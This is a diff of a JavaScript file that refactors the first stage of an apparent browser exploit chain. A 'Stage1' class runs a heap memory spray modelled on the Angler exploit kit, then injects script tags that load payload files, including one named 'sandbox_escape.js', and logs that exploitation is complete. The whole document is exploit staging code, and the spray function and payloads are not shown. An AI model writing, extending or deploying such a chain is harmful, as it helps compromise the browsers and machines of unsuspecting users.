@@ -1,15 +1,11 @@
-let r = {};
+console.log("[STAGE1] Loaded");
+
+window.r = {}; // Make global
 
 class Stage1 {
-    constructor() {
-        console.log("[STAGE1] Initializing...");
-        this.sprayArray = null;
-    }
-
     performMemorySpray() {
         this.sprayArray = anglerMemorySpray(5000, 1024);
     }
-
     loadPayloads() {
         const payloads = [
             "./payloads/payload1.js",
@@ -17,7 +13,6 @@ class Stage1 {
             "./payloads/sandbox_escape.js",
             "./payloads/hello_world.js"
         ];
-
         payloads.forEach(payload => {
             const script = document.createElement("script");
             script.src = payload;
@@ -26,15 +21,13 @@ class Stage1 {
             document.body.appendChild(script);
         });
     }
-
     runExploit() {
         this.performMemorySpray();
         this.loadPayloads();
         console.log("[STAGE1] Exploitation completed.");
     }
 }
-
-r.si = () => {
-    const stage1 = new Stage1();
-    stage1.runExploit();
+window.r.si = function() {
+    const stg = new Stage1();
+    stg.runExploit();
 };
